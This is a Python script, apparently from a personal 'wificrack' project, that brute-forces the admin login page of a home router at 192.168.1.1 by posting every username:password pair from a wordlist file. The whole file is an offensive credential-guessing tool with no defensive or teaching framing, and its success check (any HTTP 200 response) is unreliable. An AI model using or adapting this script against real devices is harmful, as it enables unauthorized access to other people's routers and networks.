import requests
import time
# URL of the login page of the router admin console
login_url = "http://192.168.1.1/cgi-bin/index2.asp"

# Function to attempt login with a username-password pair
def login(username, password):
    session = requests.Session()
    data   = {
        'username': username,
        'password': password
    }   
    response = session.post(login_url, data=data)
    return response.status_code == 200  # Check if login was successful based on response status code

# Function to iterate through the wordlist and attempt login
def brute_force_login(wordlist_file):
    with open(wordlist_file, "r") as file:
        for line in file:
            username, password = line.strip().split(":")  # Assuming username and password are separated by ":"
            if login(username, password):
                print("Login successful!")
                print("Username:", username)
                print("Password:", password)
                return True
    time.sleep(3)
    print("Login failed for all attempts.")
    return False

# Path to the wordlist file containing username-password pairs
wordlist_file = "J:\\PROJECTS\\j\\projeect files\\wificrack\\adminwordlist.txt"


# Attempt to login using the wordlist
brute_force_login(wordlist_file)
